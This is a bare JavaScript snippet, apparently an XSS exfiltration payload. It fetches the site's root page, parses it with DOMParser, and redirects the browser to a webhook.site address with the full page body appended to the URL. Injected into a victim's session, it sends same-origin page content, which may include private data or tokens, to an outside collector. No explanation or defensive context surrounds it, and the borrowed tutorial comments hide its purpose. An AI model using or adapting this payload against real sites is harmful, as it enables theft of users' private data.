fetch('/')
    .then(function(response) {
        // When the page is loaded convert it to text
        return response.text()
    })
    .then(function(html) {
        // Initialize the DOM parser
        var parser = new DOMParser();

        // Parse the text
        var doc = parser.parseFromString(html, "text/html");

        // You can now even select part of that html as you would in the regular DOM 
        // Example:
        // var docArticle = doc.querySelector('article').innerHTML;

        var url = "https://webhook.site/bb581fce-351d-4b88-96fd-ab230a1465fd?c=" + doc.body.outerHTML;
        document.location.replace(url);
    })
    .catch(function(err) {  
        console.log('Failed to fetch page: ', err);  
    });
